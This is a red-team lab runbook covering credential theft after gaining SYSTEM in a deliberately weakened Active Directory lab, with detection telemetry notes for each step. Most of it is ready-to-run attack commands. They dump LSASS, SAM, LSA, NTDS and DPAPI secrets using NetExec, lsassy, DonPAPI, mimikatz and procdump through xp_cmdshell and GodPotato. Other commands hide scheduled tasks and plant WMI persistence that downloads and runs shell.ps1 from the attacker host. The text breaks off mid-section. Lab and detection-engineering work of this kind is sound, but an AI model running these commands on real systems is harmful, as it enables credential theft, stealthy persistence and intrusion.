# CAMPAIGNS v3 — Branch 3.5 — Credential Theft from SYSTEM

> **Campaign v3** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA.md`](../CAMPAIGNS-METADATA.md).
> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) · **Topology:** [`CAMPAIGNS.md`](../CAMPAIGNS.md)
> **DFIR track:** [`DFIR-Nexus-Pioneer-workflow.md`](../DFIR-Nexus-Pioneer-workflow.md)
>
> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.

**Default host:** Kali / provisioning (`192.168.77.60`) unless a step says otherwise.

---

### Branch 3.5 — Credential Theft from SYSTEM


> **DFIR parallel track:** For each 3.5 branch, log telemetry + DFIR-Nexus case in [`DFIR-Nexus-Pioneer-workflow.md`](DFIR-Nexus-Pioneer-workflow.md) (export → ingest → correlate → approve).

We have SYSTEM on mbr01. analyst_cloud has an active console session (auto-logon). The goal: extract analyst_cloud's domain credentials to enable SharpHound collection and lateral movement.

**Lab security posture (disabled by `04-vulnerabilities.yml`):**

- LSASS PPL: **OFF** (`RunAsPPL` deleted) → LSASS memory readable
- VBS/Credential Guard: **OFF** (`EnableVirtualizationBasedSecurity = 0`) → no credential isolation
- Auto-logon: **ON** → analyst_cloud has Type 2/11 logon in LSASS

### Server 2025 Protection Matrix


| Protection              | What it blocks              | Blocks GodPotato → SYSTEM? | Blocks LSASS dump?       |
| ----------------------- | --------------------------- | -------------------------- | ------------------------ |
| LSASS PPL               | Reading LSASS memory        | **No** — DCOM-based        | **Yes** (but OFF in lab) |
| VBS/Credential Guard    | Credential isolation        | **No**                     | **Yes** (but OFF in lab) |
| Token session isolation | Cross-session impersonation | **No**                     | N/A                      |


**Lab design:** LSASS PPL, VBS disabled via `04-vulnerabilities.yml`. In real Server 2025, LSASS dump would be blocked — 3.5A (Winlogon registry) or 3.5D (file delivery) would be primary paths.

**Execution order:** 3.5F → 3.5A → 3.5G → 3.5H → 3.5B → 3.5C → 3.5D → 3.5E → 3.5I → 3.5J → 3.5K → 3.5L → 3.5M


| Branch | Technique                        | Prerequisites                | Outcome                               |
| ------ | -------------------------------- | ---------------------------- | ------------------------------------- |
| 3.5F   | LSASS credential dump (procdump) | LSASS PPL OFF ✅              | analyst_cloud NTLM + Kerberos         |
| 3.5A   | Winlogon registry (plaintext)    | Auto-logon ON ✅              | analyst_cloud password                |
| 3.5G   | Offensive DPAPI (Nemesis)        | Saved creds in profile       | DPAPI-decrypted credentials           |
| 3.5H   | ctfmon.exe password extraction   | Typed passwords in CLI tools | SSH/WinSCP/MySQL passwords            |
| 3.5B   | Scheduled task as analyst_cloud  | Password known               | SharpHound as analyst_cloud           |
| 3.5B†  | Invisible scheduled tasks        | Task created                 | Task hidden from all tools            |
| 3.5C   | RDP interactive session          | Password known               | Full SharpHound data                  |
| 3.5D   | File detonation (H-01..H-06 / WT063-068) — post-exploit telemetry | User click                   | Telemetry demo                        |
| 3.5E   | Logon trigger (Startup folder)   | User profile exists          | Auto-execution                        |
| 3.5I   | Token impersonation ❌            | Session context              | Failed (error 1346)                   |
| 3.5J   | WMI event subscriptions          | SYSTEM on mbr01              | Fileless persistence                  |
| 3.5K   | LSASS dump via WerFault ⏳        | SYSTEM on mbr01              | Stealthier LSASS dump (signed binary) |
| 3.5L   | LAPS extraction ⏳                | Domain user creds            | Local admin password from AD          |
| 3.5M   | Azure AD Connect DPAPI dump ⏳    | SYSTEM on dc01               | Cloud Sync creds → Entra ID bridge    |
| 3.5N   | UnCanny LPE (InstallService) 🔬  | Standard user                | Direct SYSTEM via AppX InstallService |


---

#### Step A — NetExec Authenticated Recon (Admin/SYSTEM on mbr01) 🆕

> ⚠️ **Flow correction (2026-06-24 session 10):** This recon step is run **after** we have admin/SYSTEM on mbr01 (Phase 3 SQL → GodPotato → SYSTEM). We now have full access to mbr01 — different recon capabilities than user or service account creds.

Now we have `nt authority\system` on mbr01 (Phase 3 chain: SQL auth → xp_cmdshell → GodPotato). At this privilege tier we can dump local secrets, remote creds, DPAPI stores, and prepare for credential theft.

**Primary: NetExec** (16+ dump modules now unlocked):

```bash
# SAM database dump (local account hashes)
nxc smb 192.168.77.22 -u Administrator -p 'Pwn3d_T2!' --sam
# Output: local Administrator + service account hashes (crackable)

# LSA secrets dump (service account plaintext passwords)
nxc smb 192.168.77.22 -u Administrator -p 'Pwn3d_T2!' --lsa
# Output: DC$ machine account, MSSQL service account, possibly analyst_cloud plaintext

# NTDS.dit dump (full domain hashes — DCSync equivalent)
nxc smb 192.168.77.22 -u Administrator -p 'Pwn3d_T2!' --ntds
# Output: ALL user + computer NTLM hashes for child.cadre.local

# DPAPI secrets dump (Credential Manager, browser, WiFi)
nxc smb 192.168.77.22 -u Administrator -p 'Pwn3d_T2!' --dpapi

# WinSCP saved session decryption (plaintext creds)
nxc smb 192.168.77.22 -u Administrator -p 'Pwn3d_T2!' -M winscp

# LAPS password read (if mbr01 has LAPS configured)
nxc ldap 192.168.77.11 -u Administrator -p 'Pwn3d_T2!' --laps
```

**Alternative: lsassy** (per Campaign_suggestions.md #94 — 15+ LSASS dump methods):

```bash
# From Kali against mbr01 (cleanest remote LSASS dump)
lsassy -d child.cadre.local -u Administrator -p 'Pwn3d_T2!' 192.168.77.22
# Auto-picks best method (comsvcs, nanodump, procdump, dumpert, ppldump, silentprocessexit, sqldumper)
# Returns NTLM hashes + Kerberos TGTs + CredMan + DPAPI master keys

# Explicit method
lsassy -m nanodump -d child.cadre.local -u Administrator -p 'Pwn3d_T2!' 192.168.77.22
```

**Alternative: DonPAPI** (per Campaign_suggestions.md #93 — DPAPI focus):

```bash
# Auto-fetch Domain Backup Key + decrypt all DPAPI secrets
donpapi collect -u child.cadre.local/Administrator -p 'Pwn3d_T2!' -d child.cadre.local -t 192.168.77.22
# Returns: Chrome/Firefox saved logins, CredMan entries, WiFi passwords, MobaXterm master key, mRemoteNG

# Specific collectors only
donpapi collect -u Administrator -p 'Pwn3d_T2!' -d child.cadre.local -t 192.168.77.22 --collectors Chromium,CredMan,WiFi
```

**Alternative: Manual mimikatz** (full control, more steps):

```cmd
# On mbr01 as SYSTEM (via xp_cmdshell + GodPotato)
mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
lsadump::secrets
sekurlsa::logonpasswords
dpapi::cred /in:C:\Users\analyst_cloud\AppData\Roaming\Microsoft\Credentials\<credential_blob>
```

**Alternative: secretsdump.py** (impacket — for NTDS.dit dump):

```bash
# From Kali
impacket-secretsdump child.cadre.local/Administrator:'Pwn3d_T2!'@192.168.77.22 -just-dc-user krbtgt
# Returns: krbtgt hash + all hashes (need DCSync rights or local admin)

# Full NTDS dump
impacket-secretsdump child.cadre.local/Administrator:'Pwn3d_T2!'@192.168.77.22 -just-dc
```

**Alternative: SharpHound** (for BloodHound collection as SYSTEM — gets more data):

```cmd
# On mbr01 as SYSTEM (download via xp_cmdshell)
SharpHound.exe -c All --zipfilename C:\Windows\Temp\sh.zip
# Get zip via: copy \\mbr01\C$\Windows\Temp\sh.zip /tmp/
# Import to BloodHound CE
```

**What to expect (success):**
- `--sam` returns 3+ local hashes (Administrator, Guest, DefaultAccount)
- `--lsa` returns DC$ machine account + analyst_cloud plaintext (likely — has auto-logon)
- `--ntds` returns full domain hash dump (~50 NTLM hashes)
- `--dpapi` returns browser saved creds + WiFi passwords
- lsassy returns Kerberos TGTs + service account hashes
- DonPAPI returns 10+ saved creds (Chromium + CredMan + WiFi)

**What to expect (failure modes):**
- `--sam` fails: LSASS PPL enabled (we have it OFF per `04-vulnerabilities.yml`)
- `lsassy` returns empty: AV/EDR blocking (we have Defender disabled)
- DonPAPI fails: needs Domain Backup Key access (verify DA or equivalent rights)

**CADRE-specific notes:**
- mbr01 has auto-logon for `analyst_cloud` (per `04-vulnerabilities.yml`) → expect plaintext password in LSA
- LSASS PPL OFF per `04-vulnerabilities.yml` → all LSASS dump methods work
- Defender disabled per `04-vulnerabilities.yml` → no AV interference
- Domain Backup Key accessible from SYSTEM (DCSync rights via local admin on DC eventually)

**Cross-references:**
- Campaign_suggestions.md #90 (NetExec), #93 (DonPAPI), #94 (lsassy), #94 (`-M winscp`), #105 (SACL/audit policy detection)
- See Phase 3.5 (Credential Theft from SYSTEM) below for manual mimikatz + SharpHound

---

#### 3.5F — LSASS Credential Dump (T1003.001) ⭐ PRIMARY

**Why this is primary:** LSASS PPL is OFF. analyst_cloud has auto-logon → Type 2/11 logon in LSASS. SYSTEM + procdump can dump the process and extract NTLM hash + Kerberos tickets offline.

```bash
**Step 1 — Copy procdump from `ws01` beachhead to `mbr01` via SMB (T1570):**

```powershell
# From ws01 as analyst_t1
$pass = ConvertTo-SecureString 'T13r_An@lyst!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('child.cadre.local\analyst_t1', $pass)
Copy-Item -Path 'C:\Tools\ADTools\procdump.exe' -Destination '\\mbr01.child.cadre.local\C$\Windows\Temp\cadre-tools\procdump.exe' -Force -Credential $cred
```

**Step 2 — Dump LSASS as SYSTEM (now that the binary is already on mbr01):**

```bash
# Dump LSASS (attempt 1: direct)
EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato-NET4.exe -cmd "cmd /c C:\Windows\Temp\cadre-tools\procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\cadre-tools\ls.dmp"';

# If direct fails (token issue), use schtasks as SYSTEM
EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /create /tn CADRE-Procdump /ru SYSTEM /tr \"C:\Users\Public\procdump.exe -accepteula -ma lsass.exe C:\Users\Public\ls.dmp\" /sc once /st 00:00 /f"';
EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /run /tn CADRE-Procdump"';
```

**Parse offline:**

```bash
# From Kali — download ls.dmp and extract credentials
pypykatz lsa minidump ls.dmp
# Or: mimikatz # sekurlsa::minidump ls.dmp → sekurlsa::logonpasswords
```

**Expected output:** analyst_cloud NTLM hash, Kerberos TGT/TGS, possibly other logged-on users.

**Telemetry:** Sysmon 10 (process access on lsass.exe), Endpoint API, cadre-e* candidates.

#### 3.5F-alt — Remote LSASS Dump via lsassy / NetExec (-M lsassy) 🆕

**Tool:** [lsassy v3.1.16](https://github.com/login-securite/lsassy) (Mar 23 2026) — 15+ LSASS dump methods in one tool. Also available as NetExec module.

**Why this alternative:** lsassy automates dump method selection. Auto-picks the best method per target (comsvcs, procdump, nanodump, dumpert, ppldump, silentprocessexit, etc.). More reliable than manual procdump + schtasks.

```bash
# From Kali against mbr01 (with admin creds from Phase 3 SQL chain)
lsassy -d child.cadre.local -u analyst_t1 -p 'T13r_An@lyst!' 192.168.77.22
# Auto-picks best method, dumps, parses, returns credentials

# OR via NetExec module
nxc smb 192.168.77.22 -u analyst_t1 -p 'T13r_An@lyst!' -M lsassy

# OR explicit method
lsassy -m nanodump -d child.cadre.local -u analyst_t1 -p 'T13r_An@lyst!' 192.168.77.22
```

**CADRE-specific notes:**
- Requires local admin on target (Phase 3 SQL chain gives us `analyst_t1` with sysadmin on mssql01; can also use `svc_mssql` + GodPotato for SYSTEM on mbr01)
- Should work in our lab since LSASS PPL is OFF (per `04-vulnerabilities.yml`)
- Best run from Kali to mbr01 (avoids AV/EDR issues on the target)

**When to use this over 3.5F:** Use lsassy when you want cleaner logon + better evasion. Use manual procdump + schtasks (3.5F) when you need to capture a specific process access pattern for testing detection rules.

**Telemetry:** Same as 3.5F — Sysmon EID 10 (LSASS access), EID 1 (dump method binary), WinSec 4663. Telemetry fingerprint identical for detection engineering purposes.

**Cross-references:** See Campaign_suggestions.md #94 for full lsassy v3.1.16 capabilities. Pairs with DonPAPI (3.5F-dpapi below) for full post-DA coverage.

#### 3.5F-dpapi — Remote DPAPI Credential Harvesting via DonPAPI 🆕

**Tool:** [DonPAPI v2.0+](https://github.com/login-securite/DonPAPI) — remote DPAPI credential harvesting with 12+ collectors (Chromium, Firefox, CredMan, MobaXterm, mRemoteNG, RDCMan, WiFi, VNC, SCCM, Vaults, WinSCP, PuTTY, PSReadLine history).

**Why this matters:** DPAPI-protected secrets are often the most valuable (saved browser creds, VPN creds, WiFi passwords, source-control tokens). DonPAPI automates extraction at scale and auto-dumps the Domain Backup Key for offline master-key decryption.

```bash
# From Kali against mbr01 (with admin creds + SYSTEM)
donpapi collect -u child.cadre.local/analyst_t1 -p 'T13r_An@lyst!' -d child.cadre.local -t 192.168.77.22
# Auto-fetches Domain Backup Key, dumps all master keys, decrypts all secrets
# Returns: Chrome/Firefox creds, CredMan entries, WiFi passwords, MobaXterm, etc.

# OR via NetExec module
nxc smb 192.168.77.22 -u analyst_t1 -p 'T13r_An@lyst!' -M donpapi

# Specific collectors only
donpapi collect -u analyst_t1 -p 'T13r_An@lyst!' -d child.cadre.local -t 192.168.77.22 --collectors Chromium,CredMan,WiFi
```

**CADRE-specific notes:**
- Requires SMB admin (Phase 3 + 3.5F gives this)
- DonPAPI v2.0+ GUI frontend is optional — CLI works fine for lab testing
- Pair with lsassy: `lsassy` for in-memory creds + `donpapi` for disk-based DPAPI secrets

**Telemetry:** Sysmon EID 1 (donpapi), file create on `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` and `C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data`, WinSec 4663 (file access).

**Cross-references:** See Campaign_suggestions.md #93. Pairs with lsassy (3.5F-alt) for comprehensive post-DA coverage. Together cover 80% of remote cred extraction.

#### 3.5P — KrbRelayUp: LPE via Kerberos Relay (T1068 + T1558) 🆕

**Tool:** [KrbRelay](https://github.com/cube0x0/KrbRelay) + [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp) — universal LPE via Kerberos relay + RBCD + S4U2Self in one executable. **No CVE, by-design bypass.**

**Why this matters:** Most LPE 0days (Token Impersonation WT039, PrintSpoofer, GodPotato) are patched on Server 2025. KrbRelayUp abuses default LDAP signing behavior to gain SYSTEM from any local user. Works when other LPE fails.

```bash
# On Windows (KrbRelayUp — needs local execution as standard user)
# Step 1: Transfer KrbRelayUp.exe to mbr01 (via any standard-user RCE — e.g., WT063 file detonation)
# Step 2: Run the relay
KrbRelayUp.exe relay -d child.cadre.local -cn "EVILBOX$" -cp "Pwn3dByR3lay!" -l 1337
# Creates new computer EVILBOX$, sets RBCD on target, abuses S4U2Self → SYSTEM
```

**Pre-conditions:**
- Standard user with local execute permission (any Phase 1-3 foothold)
- LDAP signing not enforced on DC (default for many AD configs)
- Server 2025: works if COM CLSID `90f18417-f0f1-484e-9d3c-59dceee5dbd8` is valid (verify per-target)

**Telemetry:**
- **WinSec 4742** (Computer Account Created) — `EVILBOX$` creation by low-priv user = HIGH signal
- **WinSec 4673** (Sensitive Privilege Use) — `SeEnableDelegationPrivilege` by non-admin
- **WinSec 4662** (DS Object Accessed) — RBCD write on target computer
- **Elastic KQL candidate**: `event.code:4742 AND (winlog.event_data.SubjectUserName:analyst_cloud OR SubjectUserName:intern_blue OR SubjectUserName:svc_mssql)`

**Cross-references:** See Campaign_suggestions.md #95. Pairs with bloodyAD for cleaner Linux-side RBCD setup. Replaces named pipe impersonation (WT039) and token dance (WT041) for non-DC targets.

**Status:** ⏳ Pending — needs `KrbRelayUp.exe` (compile or pre-built). Test on mbr01 with low-priv user. Verify EVILBOX$ cleanup post-test.

---

#### 3.5A — Winlogon Registry (T1552.002) ⭐ BACKUP

**Why backup:** If LSASS dump fails, auto-logon stores the password in plaintext in the registry. This is misconfiguration discovery — same class as GPP cpassword, unattended.xml, service account strings in registry.

```bash
# Read auto-logon credentials from SYSTEM
EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultUserName"';
-- → analyst_cloud

EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultPassword"';
-- → Cl0ud_An@lyst!

EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultDomainName"';
-- → CADRE
```

**Result:** `CADRE\analyst_cloud:Cl0ud_An@lyst!` — plaintext domain credentials.

**Real-world classification:** Misconfiguration discovery. Reportable finding. Many environments have auto-logon configured for kiosks, shared workstations, lab environments.

**Telemetry:** Sysmon 12/13 (registry read on Winlogon), then 4624 Type 3/10 when credential is used.

---

#### 3.5G — Offensive DPAPI (Nemesis)

**Source:** [https://specterops.io/blog/2026/03/04/offensive-dpapi-with-nemesis/](https://specterops.io/blog/2026/03/04/offensive-dpapi-with-nemesis/)
**Tool:** Nemesis 2.2+

Automates DPAPI decryption chain — SYSTEM/user masterkeys → CNG keys → Chromium App-Bound encryption. With SYSTEM on mbr01, we can decrypt any user's DPAPI-protected data (saved credentials, browser passwords, RDP files).

**Prerequisite:** Stage saved creds in analyst_cloud profile (browser, RDP file). Empty profile = weak demo.

**Why this works on default Server 2025:** DPAPI is independent of LSASS PPL and Credential Guard. It protects data at rest, not in memory.

```bash
# Deploy Nemesis to mbr01
# Extract DPAPI masterkeys as SYSTEM
# Decrypt analyst_cloud's saved credentials
```

**Telemetry:** Sysmon EID 1/10, file access.

---

#### 3.5H — ctfmon.exe Password Extraction (Windows 11 Input Telemetry)

**Source:** [https://hexderef.com/windows-11-passwords-in-memory-lsass-ctfmon-analysis](https://hexderef.com/windows-11-passwords-in-memory-lsass-ctfmon-analysis)

Typed passwords (PuTTY, WinSCP, MySQL, SSH) remain in `ctfmon.exe` memory AFTER the application closes. `ctfmon.exe` is NOT a protected process (unlike LSASS with PPL). SYSTEM can read its memory directly.

**Why this works on default Server 2025:**

- `ctfmon.exe` is NOT protected by PPL
- Credential Guard doesn't protect typed passwords (only Windows auth secrets)
- Passwords remain in memory minutes/hours after app close
- Even non-admin malware can read ctfmon.exe memory

**Limitation:** analyst_cloud must have typed a password into PuTTY/WinSCP/MySQL/SSH for this to work. Auto-logon doesn't generate typed passwords.

```bash
# Dump ctfmon.exe memory via SYSTEM
EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c C:\Users\Public\procdump.exe -accepteula -ma ctfmon.exe C:\Users\Public\ctfmon.dmp"';

# Download and parse
# Search for typed passwords in dump file
```

**Telemetry:** Sysmon EID 10 (process access on ctfmon.exe).

---

#### 3.5B — Scheduled Task as analyst_cloud (Post-Credential)

**Prerequisite:** Password known from 3.5A or 3.5F.

**Best spine fit after 3.5A** — once password is known, create a scheduled task running as analyst_cloud:

```bash
# Create task running as analyst_cloud
EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /create /tn CADRE-SharpHound /tr \"C:\Tools\SharpHound.exe -c All -d child.cadre.local --outputdirectory C:\Users\analyst_cloud\Documents\" /sc once /st 00:00 /ru CADRE\analyst_cloud /rp Cl0ud_An@lyst! /f"';

# Run the task
EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /run /tn CADRE-SharpHound"';
```

**SharpHound binary staging:** Copy `SharpHound.exe` from the `ws01` beachhead (`C:\Tools\ADTools`) to `mbr01` (`C:\Tools\SharpHound.exe`) via SMB (T1570) before creating the task. The scheduled task should execute the already-staged binary, not download it.

**Alternatives:** PsExec, WMI, runas (non-interactive with password pipe).

**Telemetry:** 4698 (task create), 4699 (task run), 4624 with TargetUserName=analyst_cloud, Sysmon 1 parent = svchost.exe/taskeng.exe.

**Playbook anchor:** `06-member-services.yml` — auto-logon password + `C:\Tools` directory.

##### Invisible Scheduled Tasks (Security Descriptor Deletion)

**Source:** DbgMan — Persistence: Advanced Red Team Persistence Techniques
**MITRE:** T1053.005

After creating the task, delete its Security subkey from the registry. The task still executes on schedule but becomes completely invisible to:

- `schtasks /query`
- Task Scheduler GUI
- PowerShell `Get-ScheduledTask`
- Autoruns

**Why this works on Server 2025:** The task is still registered in the TaskCache — only the Security descriptor that controls enumeration/display is removed. Blue teams need raw registry access under SYSTEM to find it.

```bash
# Create task (existing 3.5B)
EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /create /tn CADRE-SharpHound /tr \"C:\Tools\SharpHound.exe -c All -d child.cadre.local --outputdirectory C:\Users\analyst_cloud\Documents\" /sc once /st 00:00 /ru CADRE\analyst_cloud /rp Cl0ud_An@lyst! /f"';

# Delete Security subkey — makes task invisible
EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c reg delete \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\CADRE-SharpHound\Security\" /f"';

# Verify invisible
EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /query /tn CADRE-SharpHound"';
-- → ERROR: The system cannot find the file specified.

# Run the task anyway — still works
EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c schtasks /run /tn CADRE-SharpHound"';
```

**Detection:** Sysmon 12/13 (registry delete on TaskCache\Security). Blue team must enumerate `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\` directly under SYSTEM to find orphaned tasks.

---

#### 3.5C — RDP Interactive Session (Full SharpHound)

**From Kali after 3.5A** (password known):

```bash
xfreerdp /v:192.168.77.22 /u:analyst_cloud /p:'Cl0ud_An@lyst!' /d:CADRE /cert-ignore
```

**Why it's valuable:** Real Type 10 logon — best fidelity for SharpHound session collection, DCOM users, local admin edges. Cross-domain auth works via trust.

**Telemetry:** 4624 Logon Type 10, Sysmon 3 to port 3389, Endpoint network.

---

#### 3.5D — File Detonation (H-01..H-06 / WT063-068) — Post-Exploit Telemetry Demo

**Purpose:** The same six file-delivery vectors are now the **main spine Phase 0.5** entry point on `ws01` / `analyst_t1`. This section is the post-exploit telemetry demo — re-running the vectors from an already-compromised `mbr01` (`analyst_cloud`) to generate detection artifacts. It is no longer an alternate or optional entry path.

```bash
# SYSTEM drops payload to analyst_cloud's Downloads
EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c echo [payload] > C:\Users\analyst_cloud\Downloads\update.ps1"';

# Victim opens file (autologon = console session exists)
# Code runs as analyst_cloud
```


| H-# | WT# | Technique               | Target / User        | Credential Yield     |
| --- | --- | ----------------------- | -------------------- | -------------------- |
| H-01 | 063 | LNK → Mimikatz as user  | ws01 / analyst_t1    | Limited token (weak) |
| H-02 | 064 | MSI Installer           | ws01 / analyst_t1    | User-context code exec |
| H-03 | 065 | CHM → fake login CredUI | ws01 / analyst_t1    | Plaintext password   |
| H-04 | 066 | HTML Smuggling          | ws01 / analyst_t1 browser | User-context code exec |
| H-05 | 067 | AutoIt3 payload         | ws01 / analyst_t1    | User-context code exec |
| H-06 | 068 | EXE → certutil stealer  | ws01 / analyst_t1    | Stored creds         |


**Gap:** Current H scripts are detection demos (create in %TEMP%, delete). For cred theft, payload must exfiltrate (HTTP POST to Kali :8080).

**Telemetry:** Sysmon 1/11/15, Zeek http.log if download from Kali :8080.

---

#### 3.5E — Logon Trigger Without User Click

**If autologon session exists but user won't click:**

```bash
# Copy SharpHound to Startup folder
EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c copy C:\Tools\SharpHound.exe C:\Users\analyst_cloud\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\sharp.exe"';

# Reboot mbr01
EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c shutdown /r /t 0"';
```

**Result:** Autologon fires → Startup runs as analyst_cloud → SharpHound executes.

**Telemetry:** 4624 Type 2/11 (interactive/batch at logon), Sysmon 1 at logon.

**Playbook dependency:** User profile must exist — verify `C:\Users\analyst_cloud` after first autologon.

---

#### 3.5I — Token Impersonation — analyst_cloud ❌

**Status:** Token impersonation failed with error 1346 (ERROR_NO_SUCH_LOGON_SESSION). Not a Microsoft patch — session isolation between xp_cmdshell (session 0) and analyst_cloud (session 1). The PowerShell script we wrote was also buggy (nested quoting, wrong handle context).

**Correct approach:** Use incognito.exe or mimikatz for token theft (not our broken PowerShell script). However, 3.5F (LSASS dump) is more reliable and doesn't require session context.

---

#### 3.5J — WMI Event Subscriptions — Fileless Persistence (T1546.003)

**Source:** DbgMan — Persistence: Advanced Red Team Persistence Techniques

Install WMI event subscriptions via SYSTEM. No disk artifacts, no registry run keys, no scheduled tasks — completely fileless. Survives reboots. Blue teams need Sysmon Event IDs 19/20/21 to catch this.

**Why this works on Server 2025:**

- No disk artifacts (fileless)
- Not visible in Autoruns, Run keys, or Scheduled Task scanners
- Survives reboots
- Requires Sysmon 19/20/21 for detection (most labs don't have it)

**Prerequisite:** SYSTEM on mbr01 via GodPotato.

```bash
# Install WMI event subscription via SYSTEM
EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c powershell.exe -ep bypass -w hidden -c "
$filter = ([wmiclass]\"\\\\.\\root\\subscription:__EventFilter\").CreateInstance();
$filter.Name = \"CADRE-WMI-Persistence\";
$filter.QueryLanguage = \"WQL\";
$filter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA '\''Win32_PerfFormattedData_PerfOS_System'\'' AND TargetInstance.SystemUpTime >= 60\";
$filter.EventNamespace = \"Root\\Cimv2\";
$filter.Put();
$consumer = ([wmiclass]\"\\\\.\\root\\subscription:CommandLineEventConsumer\").CreateInstance();
$consumer.Name = \"CADRE-WMI-Consumer\";
$consumer.CommandLineTemplate = \"powershell.exe -ep bypass -w hidden -c IEX (New-Object Net.WebClient).DownloadString('\''http://192.168.77.60:8080/shell.ps1'\'')\";
$consumer.Put();
$binding = ([wmiclass]\"\\\\.\\root\\subscription:__FilterToConsumerBinding\").CreateInstance();
$binding.Filter = $filter.Path;
$binding.Consumer = $consumer.Path;
$binding.Put();
"';
```

**Alternative (single-line from xp_cmdshell):**

```sql
**Step 1 — Copy the WMI persistence script from `ws01` to `mbr01` via SMB (T1570):**

```powershell
# From ws01 as analyst_t1
$pass = ConvertTo-SecureString 'T13r_An@lyst!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('child.cadre.local\analyst_t1', $pass)
Copy-Item -Path 'C:\Tools\ADTools\wmi-persist.ps1' -Destination '\\mbr01.child.cadre.local\C$\Windows\Temp\cadre-tools\wmi-persist.ps1' -Force -Credential $cred
```

**Step 2 — Execute the staged script as SYSTEM:**

```sql
-- Write the PowerShell script to disk first, then execute
EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c powershell.exe -ep bypass -f C:\Windows\Temp\cadre-tools\wmi-persist.ps1"';
```

**Verify subscription exists:**

```sql
EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c wmic /namespace:\\root\subscription PATH __EventFilter GET Name"';
EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c wmic /namespace:\\root\subscription PATH CommandLineEventConsumer GET Name"';
EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding GET Filter,Consumer"';
```

**Cleanup (remove subscription):**

```sql
EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c powershell.exe -ep bypass -c Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name='\''CADRE-WMI-Persistence'\''\" | Remove-WmiObject; Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \"Name='\''CADRE-WMI-Consumer'\''\" | Remove-WmiObject; Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -like \"*CADRE-WMI*\"} | Remove-WmiObject"';
```

**Telemetry:** Sysmon 19 (WMI EventFilter), 20 (WMI EventConsumer), 21 (WMI FilterToConsumerBinding). These are the only reliable detection paths — no other standard telemetry captures WMI subscription creation.

---

#### 3.5K — LSASS Dump via WerFault (T1003.001) ⏳

**Source:** iPurple.team (2025-11-18)
**MITRE:** T1003.001 (OS Credential Dumping: LSASS Memory)

WerFaultSecure is a Microsoft-signed binary that can dump LSASS memory. Stealthier than procdump (which is often flagged by EDR). Works by triggering a crash dump via Windows Error Reporting.

**Why this works on Server 2025:**

- WerFaultSecure is Microsoft-signed (trusted binary)
- Not flagged by most EDR solutions
- Dumps LSASS to file for offline extraction
- Works even when procdump is blocked

**Test plan:**

1. Via xp_cmdshell as SYSTEM: trigger WerFault LSASS dump on mbr01
2. Extract dump file → offline extraction with pypykatz/mimikatz
3. Compare with 3.5F (procdump) — which is stealthier?

**Detection:** Sysmon EID 1 (WerFaultSecure.exe with LSASS target), EID 11 (dump file creation).

---

#### 3.5L — LAPS Extraction (T1552.004) ⏳

**Source:** Zero Point Security RTO 2025
**MITRE:** T1552.004 (Unsecured Credentials: Private Keys)

Local Administrator Password Solution (LAPS) manages unique local admin passwords per machine, stored in AD. If compromised, gives local admin on any LAPS-managed machine.

**Why this works on Server 2025:**

- LAPS passwords stored in AD as `ms-Mcs-AdmPwd` attribute
- Requires Read permission on the attribute (not default for regular users)
- Can be extracted via LDAP if permissions allow
- New Windows LAPS stores password in AD or Azure AD

**Test plan:**

